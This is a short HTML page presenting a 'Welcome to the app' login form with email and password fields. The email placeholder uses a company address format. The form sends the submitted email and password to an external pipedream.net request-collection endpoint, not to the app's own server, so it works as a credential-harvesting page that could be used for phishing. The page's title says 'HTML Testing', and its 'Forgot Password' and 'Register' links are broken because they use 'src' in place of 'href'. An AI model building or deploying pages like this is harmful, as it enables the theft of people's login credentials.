<!DOCTYPE html>
<html>
    <head>
        <title>HTML Testing</title>
    </head>
    <body>
        <h1>Welcome to the app</h1>
        <form name="login-form" action="https://eojd6if7qzeoeqb.m.pipedream.net" method="POST">
            <fieldset>
            <legend>Login</legend>
            <label for="email-input">Email:</label>
            <input type="email" id="email-input" name="email-input" placeholder="first.last@nexcoregroup.com" required><br><br>
            <label for="password-input">Password:</label>
            <input type="password" id="password-input" name="password-input" required><br><br>
            <input type="submit" value="Submit"><br><br>
            </fieldset>
        </form>
        <a src="/forgot.html" alt="forgot password">Forgot Password? </a><br><br>
        <a src="/register.html" alt="">Register new user</a>
    </body>
</html>
